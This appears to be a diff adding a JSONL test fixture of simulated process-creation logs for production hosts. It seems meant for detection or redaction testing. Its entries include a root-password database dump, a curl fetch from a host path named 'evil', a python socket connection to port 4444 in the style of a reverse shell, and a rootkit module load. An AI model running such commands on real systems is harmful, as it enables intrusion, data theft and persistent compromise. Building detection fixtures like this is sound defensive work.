@@ -1,0 +1,8 @@
+{"TimeStamp":"2025-05-29T10:00:01.000Z","VMName":"prd-db-01","ProcessId":1234,"ParentProcessId":1,"Image":"/usr/bin/sshd","CommandLine":"sshd -D","EventId":1}
+{"TimeStamp":"2025-05-29T10:00:02.000Z","VMName":"prd-db-01","ProcessId":1235,"ParentProcessId":1234,"Image":"/usr/bin/bash","CommandLine":"bash -c \"whoami\"","EventId":1}
+{"TimeStamp":"2025-05-29T10:00:03.000Z","VMName":"prd-db-01","ProcessId":1236,"ParentProcessId":1235,"Image":"/usr/bin/mysqldump","CommandLine":"mysqldump -u root -p SuperSecretPassword123 production_db","EventId":1,"ShouldBeRedacted":true}
+{"TimeStamp":"2025-05-29T10:00:04.000Z","VMName":"prd-web-01","ProcessId":4567,"ParentProcessId":1,"Image":"/usr/sbin/httpd","CommandLine":"httpd -k start","EventId":1}
+{"TimeStamp":"2025-05-29T10:00:05.000Z","VMName":"prd-web-01","ProcessId":4568,"ParentProcessId":4567,"Image":"/usr/bin/curl","CommandLine":"curl -s http://10.0.0.100:8080/evil","EventId":1}
+{"TimeStamp":"2025-05-29T10:00:06.000Z","VMName":"prd-db-01","ProcessId":1237,"ParentProcessId":1,"Image":"/usr/bin/python3","CommandLine":"python3 -c \"import socket;s=socket.socket();s.connect(('192.168.1.100',4444))\"","EventId":1}
+{"TimeStamp":"2025-05-29T10:00:10.000Z","VMName":"prd-db-01","ProcessId":1238,"ParentProcessId":1,"Image":"/sbin/insmod","CommandLine":"insmod /tmp/rootkit.ko","EventId":1}
+{"TimeStamp":"2025-05-29T10:01:00.000Z","VMName":"prd-db-01","ProcessId":4,"Image":"/usr/bin/sshd","EventId":8,"ThreadId":5}
